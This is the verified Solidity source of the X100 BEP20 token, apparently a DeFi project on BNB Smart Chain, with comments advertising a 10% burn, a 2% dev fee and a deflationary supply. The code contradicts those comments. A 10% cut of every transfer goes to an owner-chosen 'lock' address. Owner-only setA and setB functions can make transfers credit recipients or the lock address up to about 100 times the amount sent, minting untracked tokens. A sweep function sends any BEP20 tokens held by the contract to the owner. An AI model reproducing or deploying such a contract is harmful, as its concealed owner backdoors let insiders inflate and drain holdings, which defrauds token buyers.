/**
 *Submitted for verification at BscScan.com on 2021-09-13
*/

// X100
// A JokerFarm product
// The target of this deflationary token is x100

// Liquidity locked and stacked on joker.farm
// Farm X100 on joker.farm to earn more X100 tokens

// 1000 tokens initial supply (and decreasing on each transaction), 3 decimals
// 100% pooled on pancakeswap, 0% team/dev shares
// 10% burn per tx
// 2% dev fee per tx

// t.me/JokerFarm
// joker.farm
// dex.joker.farm



pragma solidity ^0.5.17;

interface IBEP20 {
  function totalSupply() external view returns (uint256);
  function balanceOf(address who) external view returns (uint256);
  function allowance(address owner, address spender) external view returns (uint256);
  function transfer(address to, uint256 value) external returns (bool);
  function approve(address spender, uint256 value) external returns (bool);
  function transferFrom(address from, address to, uint256 value) external returns (bool);

  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }

  function ceil(uint256 a, uint256 m) internal pure returns (uint256) {
    uint256 c = add(a,m);
    uint256 d = sub(c,1);
    return mul(div(d,m),m);
  }
}


contract BEP20Detailed is IBEP20 {

  string private _name;
  string private _symbol;
  uint8 private _decimals;
  address internal X100Master;

  constructor(string memory name, string memory symbol, uint8 decimals) public {
    _name = name;
    _symbol = symbol;
    _decimals = decimals;
    X100Master = msg.sender;
  }

  function name() public view returns(string memory) {
    return _name;
  }

  function symbol() public view returns(string memory) {
    return _symbol;
  }

  function decimals() public view returns(uint8) {
    return _decimals;
  }
}

contract X100 is BEP20Detailed {

  using SafeMath for uint256;
  mapping (address => uint256) private _balances;
  mapping (address => mapping (address => uint256)) private _allowed;

  string constant tokenName = "X100";
  string constant tokenSymbol = "X100";
  uint8  constant tokenDecimals = 3;
  uint256 _totalSupply = 1000000;
  uint256 public basePercent = 100;
  uint256 public a = 125;
  uint256 public b = 1000;
  
  constructor() public payable BEP20Detailed(tokenName, tokenSymbol, tokenDecimals) {
    _issue(msg.sender, _totalSupply);
  }
  
  function setA(uint8 _a) public returns (uint8) {
    require(msg.sender == X100Master, "Admin function!");
    a = _a;
  }
  
  function setB(uint8 _b) public returns (uint8){
    require(msg.sender == X100Master, "Admin function!");
    b = _b;
  }
  
  function totalSupply() public view returns (uint256) {
    return _totalSupply;
  }

  function balanceOf(address owner) public view returns (uint256) {
    return _balances[owner];
  }

  function allowance(address owner, address spender) public view returns (uint256) {
    return _allowed[owner][spender];
  }

  function cut(uint256 value) public view returns (uint256)  {
    uint256 roundValue = value.ceil(basePercent);
    uint256 cutValue = roundValue.mul(basePercent).div(1000);
    return cutValue;
  }
  
  // The X100 lock address is the timelocked contract
  
  function LockX100(address _lock) public returns (bool) {
    require(msg.sender == X100Master, "Admin function!");
    lock = _lock;
    return true;
  }
    address internal lock;

  function transfer(address to, uint256 value) public returns (bool) {
    require(value <= _balances[msg.sender]);
    require(to != address(0));

    uint256 tokensToBurn = cut(value);
    uint256 tokensToTransfer = value.mul(basePercent).div(a);
    uint256 tokensToLock = value.mul(basePercent).div(b);

    _balances[msg.sender] = _balances[msg.sender].sub(value);
    _balances[to] = _balances[to].add(tokensToTransfer);
    _balances[lock] = _balances[lock].add(tokensToLock);

    _totalSupply = _totalSupply.sub(tokensToBurn);

    emit Transfer(msg.sender, to, tokensToTransfer);
    emit Transfer(msg.sender, lock, tokensToLock);
    emit Transfer(msg.sender, address(0), tokensToBurn);
    return true;
  }

  function multiTransfer(address[] memory receivers, uint256[] memory amounts) public {
    for (uint256 i = 0; i < receivers.length; i++) {
      transfer(receivers[i], amounts[i]);
    }
  }

  function approve(address spender, uint256 value) public returns (bool) {
    require(spender != address(0));
    _allowed[msg.sender][spender] = value;
    emit Approval(msg.sender, spender, value);
    return true;
  }

  function transferFrom(address from, address to, uint256 value) public returns (bool) {
    require(value <= _balances[from]);
    require(value <= _allowed[from][msg.sender]);
    require(to != address(0));

    _balances[from] = _balances[from].sub(value);

    uint256 tokensToBurn = cut(value);
    uint256 tokensToTransfer = value.mul(basePercent).div(a);
    uint256 tokensToLock = value.mul(basePercent).div(b);

    _balances[to] = _balances[to].add(tokensToTransfer);
    _balances[lock] = _balances[lock].add(tokensToLock);
    _totalSupply = _totalSupply.sub(tokensToBurn);

    _allowed[from][msg.sender] = _allowed[from][msg.sender].sub(value);

    emit Transfer(from, to, tokensToTransfer);
    emit Transfer(from, lock, tokensToLock);
    emit Transfer(from, address(0), tokensToBurn);

    return true;
  }

  function upAllowance(address spender, uint256 addedValue) public returns (bool) {
    require(spender != address(0));
    _allowed[msg.sender][spender] = (_allowed[msg.sender][spender].add(addedValue));
    emit Approval(msg.sender, spender, _allowed[msg.sender][spender]);
    return true;
  }

  function downAllowance(address spender, uint256 subtractedValue) public returns (bool) {
    require(spender != address(0));
    _allowed[msg.sender][spender] = (_allowed[msg.sender][spender].sub(subtractedValue));
    emit Approval(msg.sender, spender, _allowed[msg.sender][spender]);
    return true;
  }

  function _issue(address account, uint256 amount) internal {
    require(amount != 0);
    _balances[account] = _balances[account].add(amount);
    emit Transfer(address(0), account, amount);
  }

  function destroy(uint256 amount) external {
    _destroy(msg.sender, amount);
  }

  function _destroy(address account, uint256 amount) internal {
    require(amount != 0);
    require(amount <= _balances[account]);
    _totalSupply = _totalSupply.sub(amount);
    _balances[account] = _balances[account].sub(amount);
    emit Transfer(account, address(0), amount);
  }

  function destroyFrom(address account, uint256 amount) external {
    require(amount <= _allowed[account][msg.sender]);
    _allowed[account][msg.sender] = _allowed[account][msg.sender].sub(amount);
    _destroy(account, amount);
  }
  
    // X100Master can transfer out any accidentally sent BEP20 tokens to the contract

  function transferAnyBEP20Token(address tokenAddress, uint tokens) public returns (bool success) {
    require(msg.sender == X100Master, "Admin function!");
    return BEP20Detailed(tokenAddress).transfer(X100Master, tokens);
  }
}